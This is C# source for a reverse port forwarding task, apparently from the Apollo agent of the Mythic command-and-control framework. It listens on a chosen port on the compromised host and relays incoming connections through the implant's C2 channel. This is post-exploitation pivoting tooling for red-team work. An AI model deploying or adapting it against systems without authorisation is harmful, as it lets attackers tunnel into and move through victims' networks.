#define COMMAND_NAME_UPPER

#if DEBUG
#define RPFWD
#endif

#if RPFWD

using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System.Net.Sockets;
using System.Net;
using System.Runtime.Serialization;
using System;
using ApolloInterop.Utils;
using System.Threading;

namespace Tasks
{
    public class rpfwd : Tasking
    {
        public rpfwd(IAgent agent, MythicTask data) : base(agent, data)
        {
        }
        [DataContract]
        internal struct RpfwdParameters
        {
            [DataMember(Name = "port")] public int Port;
            [DataMember(Name = "action")] public string Action;
        }
        private int _port;
        private TcpListener _server;
       
        private Random _random = new Random((int) DateTime.UtcNow.Ticks);
        private void OnClientConnected(IAsyncResult result)
        {
            // complete connection
            try
            {
                TcpListener server = (TcpListener)result.AsyncState;
                TcpClient client = server.EndAcceptTcpClient(result);
                int newClientID = _random.Next(int.MaxValue);
                DebugHelp.DebugWriteLine($"Got a new connection: {newClientID}");
                // Add to connection list at a higher level that can be routed to
                if (_agent.GetRpfwdManager().AddConnection(client, newClientID, _port))
                {
                    DebugHelp.DebugWriteLine("accepting more connections");
                    // need to explicitly accept more connection after handling the first one
                    _server.BeginAcceptTcpClient(OnClientConnected, _server);
                }
                else
                {
                    client.Close();
                }
            }
            catch (Exception ex)
            {
                _agent.GetTaskManager().AddTaskResponseToQueue(
                    CreateTaskResponse("Failed to accept connection: " + ex.Message, false, "")
                );
                return;
            }
            
        }

        public override void Start()
        {
            MythicTaskResponse resp;
            var parameters = _jsonSerializer.Deserialize<RpfwdParameters>(_data.Parameters);
            _port = parameters.Port;
            _server = new TcpListener(IPAddress.Any, _port);
            try
            {
                _server.Start();
                _server.BeginAcceptTcpClient(OnClientConnected, _server);
            }
            catch (Exception ex)
            {
                resp = CreateTaskResponse("Failed to start listening on port: " + ex.Message, true, "error");
                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
                return;
            }

            resp = CreateTaskResponse("Started listening on port: " + parameters.Port, false, "listening for connections...");
            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
            WaitHandle[] waiters = new WaitHandle[]
            {
                _cancellationToken.Token.WaitHandle
            };
            WaitHandle.WaitAny(waiters);
            _server.Stop();
            _agent.GetTaskManager().AddTaskResponseToQueue(
                CreateTaskResponse("Stopped Listening on port " + _port, true, "success")
            );
        }
    }
}
#endif